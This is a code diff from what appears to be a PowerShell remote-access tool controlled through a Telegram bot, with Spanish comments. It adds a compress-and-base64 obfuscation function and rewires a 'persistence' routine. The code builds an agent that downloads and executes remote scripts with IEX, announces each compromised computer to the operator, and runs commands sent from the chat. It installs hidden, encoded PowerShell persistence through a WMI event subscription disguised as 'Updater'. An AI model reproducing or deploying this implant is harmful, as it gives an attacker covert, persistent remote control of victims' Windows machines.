@@ -3,7 +3,24 @@
 function create_agent {param ($botkey,$chat_id)
 $agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content;$chat_id = $bot_Master_ID ; $getMeLink = "https://api.telegram.org/bot$botkey/getMe" ; $bot = $getMeLink -split "/" ;$bot = [string]$bot[3];$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1";while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json;$l = $json.result.length;$i = 0;if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected con bypassuac :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1};while ($i -lt $l) {$offset = $json.result[$i].update_id + 1; $comando = $json.result[$i].message.text;test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect;$i++} ;Start-Sleep -s $delay ;$first_connect++ }' ; $agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" ; return $agent_bot}
 
-
+function code_a_base64 {param ($code)
+$ms = New-Object IO.MemoryStream
+$action = [IO.Compression.CompressionMode]::Compress
+$cs = New-Object IO.Compression.DeflateStream ($ms,$action)
+$sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
+$code | ForEach-Object {$sw.WriteLine($_)}
+$sw.Close()
+$Compressed = [Convert]::ToBase64String($ms.ToArray())
+$command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
+"`$(New-Object IO.Compression.DeflateStream (" +
+"`$(New-Object IO.MemoryStream (,"+
+"`$([Convert]::FromBase64String('$Compressed')))), " +
+"[IO.Compression.CompressionMode]::Decompress)),"+
+" [Text.Encoding]::ASCII)).ReadToEnd();"
+$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
+$codeScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
+return $codeScript
+}
 
 ################################################ Cargamos funciones de otros proyectos ########################################################################
 
@@ -177,7 +194,7 @@ Remove-Item $ruta_ps1 ; sleep -Seconds 5 ; Remove-Item $ruta
 function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
-$agent_bot = create_agent -botkey $botkey -chat_id $chat_id ; $ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta_temp = $env:USERPROFILE + "\appdata\local\temp\1"; $ruta_temp = $ruta_temp + "\temp.ps1"; $agent_bot | out-file -Encoding ascii $ruta_temp ; IEX (Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/ScriptModification/Out-EncodedCommand.ps1").content ; $code = Out-EncodedCommand -Path $ruta_temp -EncodedOutput ; Remove-Item $ruta_temp ;  $code = $code -replace '"',""; $code = $code -replace "powershell  -E ", ""
+$agent_bot = create_agent -botkey $botkey -chat_id $chat_id; $code = code_a_base64 -code $agent_bot
 Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -win hidden -enc $code";RunInteractively='false'};Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null
 $texto = "Persistencia ejecutada correctamente"; return $texto;break}
 }
